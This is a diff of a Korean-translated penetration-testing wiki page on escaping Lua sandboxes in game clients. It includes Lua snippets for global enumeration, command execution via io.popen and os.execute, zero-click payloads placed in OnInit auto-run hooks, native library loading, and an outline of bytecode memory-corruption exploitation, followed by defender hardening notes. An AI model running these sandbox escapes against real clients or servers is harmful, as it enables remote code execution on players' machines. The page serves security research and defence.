@@ -1,18 +1,18 @@
-# Bypass Lua sandboxes (embedded VMs, game clients)
+# Lua sandbox 우회 (embedded VMs, game clients)
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-이 페이지는 애플리케이션(특히 game clients, plugins, 또는 in-app scripting engines)에 내장된 Lua "sandboxes"를 열거하고 탈출하는 실용적인 기법들을 모아둡니다. 많은 엔진이 제한된 Lua 환경을 노출하지만, 바이트코드 로더가 노출되는 경우 임의 명령 실행이나 네이티브 메모리 손상까지 가능한 강력한 globals에 접근할 수 있도록 남겨두는 경우가 많습니다.
+이 페이지에서는 애플리케이션(특히 game clients, plugins 또는 in-app scripting engines)에 embedded된 Lua "sandboxes"를 열거하고 탈출하기 위한 실용적인 기법을 정리합니다. 많은 engine은 제한된 Lua environment를 노출하지만, arbitrary command execution을 가능하게 하거나 bytecode loaders가 노출된 경우 native memory corruption까지 일으킬 수 있는 강력한 globals에 대한 접근 경로를 남겨 둡니다.
 
-Key ideas:
-- VM을 알 수 없는 환경으로 취급하세요: _G를 열거하여 어떤 위험한 primitives에 접근 가능한지 확인합니다.
-- stdout/print이 차단된 경우, 결과를 관찰하기 위해 in-VM UI/IPC 채널을 출력 싱크로 악용하세요.
-- io/os가 노출되어 있으면, 보통 직접 명령 실행(io.popen, os.execute)이 가능합니다.
-- load/loadstring/loadfile이 노출되어 있으면, 조작된 Lua bytecode 실행으로 일부 버전에서 메모리 안전성이 무너질 수 있습니다 (≤5.1의 verifier는 우회 가능; 5.2는 verifier를 제거), 이를 통해 고급 익스플로잇이 가능해집니다.
+핵심 아이디어:
+- VM을 알 수 없는 environment로 취급합니다. _G를 열거하고 접근 가능한 위험한 primitives를 찾습니다.
+- stdout/print가 차단된 경우, in-VM UI/IPC channel을 output sink로 악용하여 결과를 확인합니다.
+- io/os가 노출되어 있다면 직접적인 command execution이 가능한 경우가 많습니다(io.popen, os.execute).
+- load/loadstring/loadfile이 노출되어 있다면 crafted Lua bytecode를 실행하여 일부 버전에서 memory safety를 우회할 수 있습니다(≤5.1 verifier는 우회 가능하며, 5.2에서는 verifier가 제거됨). 이를 통해 advanced exploitation이 가능해집니다.
 
-## Enumerate the sandboxed environment
+## sandboxed environment 열거
 
-- Dump the global environment to inventory reachable tables/functions:
+- 접근 가능한 tables/functions를 파악하기 위해 global environment를 dump합니다:
 ```lua
 -- Minimal _G dumper for any Lua sandbox with some output primitive `out`
 local function dump_globals(out)
@@ -22,7 +22,7 @@ out(tostring(k) .. " = " .. tostring(v))
 end
 end
 ```
-- print()이 사용 불가능하면 in-VM 채널을 재사용하세요. MMO housing script VM의 예로, 채팅 출력은 사운드 호출 이후에만 동작합니다; 다음은 신뢰할 수 있는 출력 함수를 구축하는 예입니다:
+- print()를 사용할 수 없다면 VM 내부 채널을 용도 변경합니다. 예를 들어 MMO 하우징 스크립트 VM에서는 sound call 이후에만 chat output이 작동하므로, 다음과 같이 안정적인 output function을 구축할 수 있습니다:<sup>[[1]](#references)</sup>
 ```lua
 -- Build an output channel using in-game primitives
 local function ButlerOut(label)
@@ -39,11 +39,11 @@ local out = ButlerOut(1)
 dump_globals(out)
 end
 ```
-대상에 대해 이 패턴을 일반화하라: 문자열을 허용하는 모든 textbox, toast, logger, 또는 UI callback은 reconnaissance를 위한 stdout 역할을 할 수 있다.
+대상에 맞게 이 패턴을 일반화하세요: 문자열을 허용하는 모든 textbox, toast, logger 또는 UI callback은 reconnaissance를 위한 stdout으로 작동할 수 있습니다.
 
-## io/os가 노출된 경우 직접적인 command execution
+## io/os가 노출된 경우의 직접적인 command execution
 
-sandbox가 여전히 표준 라이브러리인 io or os를 노출하고 있다면, 아마 즉시 command execution이 가능할 것이다:
+Sandbox에서 표준 라이브러리인 io 또는 os가 여전히 노출되어 있다면, 즉시 command execution이 가능할 수 있습니다:
 ```lua
 -- Windows example
 io.popen("calc.exe")
@@ -53,29 +53,30 @@ os.execute("/usr/bin/id")
 io.popen("/bin/sh -c 'id'")
 ```
 참고:
-- 실행은 client 프로세스 내부에서 발생합니다; 외부 디버거를 차단하는 많은 anti-cheat/antidebug 계층은 in-VM process 생성은 막지 못합니다.
-- 또한 확인할 것: package.loadlib (임의의 DLL/.so 로딩), require with native modules, LuaJIT's ffi (존재하는 경우), 그리고 debug library (VM 내부에서 권한 상승을 일으킬 수 있음).
 
-## Zero-click triggers via auto-run callbacks
+- 실행은 client process 내부에서 이루어집니다. 외부 debugger를 차단하는 많은 anti-cheat/antidebug 계층도 in-VM process creation을 막지는 못합니다.
+- 다음 항목도 확인하세요: package.loadlib (임의의 DLL/.so 로딩), native modules를 사용하는 require, LuaJIT의 ffi (존재하는 경우), 그리고 VM 내부에서 privileges를 상승시킬 수 있는 debug library.
 
-호스트 애플리케이션이 clients에 스크립트를 푸시하고 VM이 auto-run hooks를 노출한다면(예: OnInit/OnLoad/OnEnter), 스크립트가 로드되자마자 drive-by compromise를 위해 payload를 그곳에 배치하세요:
+## auto-run callbacks를 통한 zero-click triggers
+
+host application이 client에 scripts를 전달하고 VM이 auto-run hooks (예: OnInit/OnLoad/OnEnter)를 노출하는 경우, script가 로드되는 즉시 drive-by compromise가 발생하도록 payload를 해당 위치에 배치하세요:<sup>[[1]](#references)</sup>
 ```lua
 function OnInit()
 io.popen("calc.exe") -- or any command
 end
 ```
-Any equivalent callback (OnLoad, OnEnter, etc.) generalizes this technique when scripts are transmitted and executed on the client automatically.
+스크립트가 client에서 자동으로 전송되고 실행될 때는 이와 동등한 callback(OnLoad, OnEnter 등)을 통해 이 technique을 일반화할 수 있습니다.
 
-## Recon 동안 찾아야 할 위험한 프리미티브
+## recon 중 탐색해야 할 위험한 primitive
 
-During _G enumeration, specifically look for:
-- io, os: io.popen, os.execute, 파일 I/O, 환경 접근.
-- load, loadstring, loadfile, dofile: 소스 또는 바이트코드 실행; 신뢰할 수 없는 바이트코드 로딩을 허용.
-- package, package.loadlib, require: 동적 라이브러리 로딩 및 모듈 인터페이스.
-- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, 및 훅.
-- LuaJIT-only: ffi.cdef, ffi.load to call native code directly.
+_G 열거 중에는 다음을 중점적으로 확인합니다:
+- io, os: io.popen, os.execute, file I/O, env access.
+- load, loadstring, loadfile, dofile: source 또는 bytecode를 실행하며, 신뢰할 수 없는 bytecode 로딩을 지원합니다.
+- package, package.loadlib, require: dynamic library 로딩 및 module surface.
+- debug: setfenv/getfenv(≤5.1), getupvalue/setupvalue, getinfo 및 hooks.
+- LuaJIT-only: ffi.cdef, ffi.load를 사용해 native code를 직접 호출합니다.
 
-Minimal usage examples (if reachable):
+최소 사용 예시(접근 가능한 경우):
 ```lua
 -- Execute source/bytecode
 local f = load("return 1+1")
@@ -90,26 +91,26 @@ print(g())
 local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
 local foo = mylib()
 ```
-## 선택적 권한 상승: Lua bytecode 로더 악용
+## 선택적 권한 상승: Lua bytecode loaders 악용
 
-load/loadstring/loadfile가 접근 가능하지만 io/os가 제한된 경우, 조작된 Lua bytecode를 실행하면 메모리 노출 및 손상 프리미티브로 이어질 수 있습니다. 주요 내용:
-- Lua ≤ 5.1은 알려진 우회가 있는 bytecode verifier를 포함하고 있었습니다.
-- Lua 5.2는 verifier를 완전히 제거했습니다(공식 입장: 애플리케이션은 precompiled chunks를 거부해야 함). 따라서 bytecode loading이 금지되지 않으면 공격 표면이 넓어집니다.
-- 일반적인 워크플로: in-VM 출력으로 포인터를 leak한 뒤, bytecode를 만들어 type confusions(예: FORLOOP 주변이나 다른 opcodes 관련)를 유발하고, 그다음 arbitrary read/write나 native code execution으로 전환합니다.
+load/loadstring/loadfile에 접근할 수 있지만 io/os가 제한된 경우, 조작된 Lua bytecode를 실행하면 memory disclosure 및 corruption primitive로 이어질 수 있습니다. 주요 사실:
+- Lua ≤ 5.1에는 알려진 우회 방법이 존재하는 bytecode verifier가 포함되어 있었습니다.<sup>[[4]](#references)</sup>
+- Lua 5.2에서는 verifier가 완전히 제거되었습니다(공식 입장: 애플리케이션이 precompiled chunks를 거부해야 함). 따라서 bytecode loading이 금지되지 않은 경우 attack surface가 확대됩니다.<sup>[[2]](#references)[[3]](#references)</sup>
+- 일반적인 workflow는 다음과 같습니다. in-VM output을 통해 pointer를 leak하고, type confusion을 유발하는 bytecode를 작성한 다음(예: FORLOOP 또는 기타 opcode 주변), arbitrary read/write 또는 native code execution으로 전환합니다.<sup>[[2]](#references)[[4]](#references)</sup>
 
-이 경로는 engine/version-specific하며 RE가 필요합니다. 심층 분석, exploitation primitives 및 게임에서의 예제 가젯은 참고문헌을 참조하세요.
+이 경로는 engine/version에 따라 다르며 RE가 필요합니다. 자세한 분석, exploitation primitive 및 games의 example gadgetry는 references를 참조하세요.
 
-## 탐지 및 강화 노트 (수비자용)
+## Detection 및 hardening 참고 사항(Defender용)
 
-- Server side: 사용자 스크립트를 거부하거나 재작성; 안전한 API를 allowlist; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi를 제거하거나 빈 바인딩으로 대체.
-- Client side: 최소화된 _ENV로 Lua 실행; bytecode loading 금지; 엄격한 bytecode verifier 또는 서명 검사 재도입; 클라이언트 프로세스에서의 프로세스 생성 차단.
-- Telemetry: script load 직후 gameclient → 자식 프로세스 생성에 대해 경보; UI/chat/script 이벤트와 상관관계 분석.
+- Server side: user scripts를 거부하거나 다시 작성하고, 안전한 API를 allowlist로 지정하며, io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi를 제거하거나 빈 binding으로 연결합니다.
+- Client side: 최소한의 _ENV로 Lua를 실행하고, bytecode loading을 금지하며, strict bytecode verifier 또는 signature checks를 다시 도입하고, client process에서 process creation을 차단합니다.
+- Telemetry: script load 직후 gameclient → child process creation이 발생하면 alert를 생성하고, 이를 UI/chat/script events와 상관 분석합니다.
 
 ## References
 
-- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
-- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
-- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
-- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
+- [1] [This House is Haunted: AION client(housing Lua VM)의 10년 된 RCE](https://appsec.space/posts/aion-housing-exploit/)
+- [2] [Bytecode Breakdown: Factorio의 Lua Security Flaws 분석](https://memorycorruption.net/posts/rce-lua-factorio/)
+- [3] [lua-l(2009): bytecode verifier 제거에 관한 Discussion](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
+- [4] [Lua 5.1 bytecode 악용(verifier bypasses/notes가 포함된 gist)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
 
 {{#include ../../../banners/hacktricks-training.md}}
